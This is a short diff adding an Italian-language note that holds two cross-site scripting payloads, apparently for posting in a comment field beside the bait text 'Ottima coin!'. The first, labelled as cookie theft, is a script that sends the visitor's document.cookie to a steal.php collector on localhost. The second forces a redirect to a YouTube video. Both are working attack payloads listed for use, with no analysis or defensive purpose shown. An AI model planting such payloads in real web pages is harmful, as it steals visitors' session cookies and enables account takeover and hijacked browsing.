@@ -1,0 +1,8 @@
+rubare cookie:
+    Ottima coin! <script>
+    var img = new Image();
+    img.src = 'http://localhost:8080/steal.php?cookie=' + encodeURIComponent(document.cookie);
+    </script>
+
+redirect banale: (video gatti)
+    Ottima coin! <script>window.location.href = "https://youtu.be/paWE-GvDO1c?si=AJv9H30yiH3UBr3n";</script>
